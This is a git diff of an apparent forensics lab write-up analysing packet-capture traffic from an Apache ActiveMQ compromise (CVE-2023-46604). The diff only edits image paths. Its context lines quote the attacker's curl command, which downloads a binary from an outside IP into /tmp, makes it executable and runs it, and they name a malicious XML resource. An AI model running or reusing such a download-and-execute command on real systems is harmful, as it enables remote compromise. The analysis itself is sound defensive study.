@@ -58,7 +58,7 @@ The conversations revealed three main communication pairs:
 | 134.209.197.3 | 128.199.52.72 | 10 |
 | 146.190.21.92 | 134.209.197.3 | 4,867 |
 
-![IPv4 Conversations](images/01-conversations.png)
+![IPv4 Conversations](/01-conversations.png)
 
 The server IP was identified as `134.209.197.3` based on its communication patterns.
 
@@ -76,7 +76,7 @@ Important observations included:
 - XML data.
 - A significant amount of TLS traffic.
 
-![Protocol Hierarchy](images/02-protocol-hierarchy.png)
+![Protocol Hierarchy](/02-protocol-hierarchy.png)
 
 The presence of OpenWire and malformed packets led me to investigate the ActiveMQ communication further.
 
@@ -92,7 +92,7 @@ The packet revealed:
 **External XML Resource:**
 `http://146.190.21.92:8000/invoice.xml`
 
-![OpenWire ExceptionResponse](images/03-exception-response.png)
+![OpenWire ExceptionResponse](/03-exception-response.png)
 
 Further inspection revealed an HTTP GET request for:
 
@@ -130,7 +130,7 @@ Further investigation of the XML resource revealed the Java class:
 
 `java.lang.ProcessBuilder`
 
-![ProcessBuilder bean in the XML](images/04-processbuilder.png)
+![ProcessBuilder bean in the XML](/04-processbuilder.png)
 
 This class was used to execute operating system commands on the compromised server.
 
@@ -138,7 +138,7 @@ The malicious command included downloading another payload:
 
 `curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; /tmp/docker`
 
-![Malicious curl command](images/05-curl-command.png)
+![Malicious curl command](/05-curl-command.png)
 
 This command:
 
@@ -171,7 +171,7 @@ The exploited vulnerability was:
 
 This vulnerability affects Apache ActiveMQ's OpenWire protocol implementation and allows remote code execution through unsafe Java class instantiation during deserialization.
 
-![CVE-2023-46604 search result](images/06-cve-search.png)
+![CVE-2023-46604 search result](/06-cve-search.png)
 
 ### Step 10 – Understanding the Security Fix
 
